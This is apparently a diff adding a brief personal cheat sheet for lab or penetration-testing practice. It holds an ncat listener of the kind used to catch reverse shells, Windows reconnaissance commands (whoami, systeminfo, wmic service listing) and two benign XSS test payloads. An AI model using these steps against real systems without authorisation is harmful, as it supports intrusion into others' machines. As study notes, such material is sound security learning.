@@ -1,0 +1,9 @@
+ncat -lvnp 5555 -k
+whoami
+dir
+systeminfo
+dir /a => all the information including hidden files
+wmic service list brief => list out all the services in brief.
+
+<script>document.body.style.backgroundColor='red';</script>
+<div onmouseover="alert('Move your mouse over this text')">Hover over me</div>
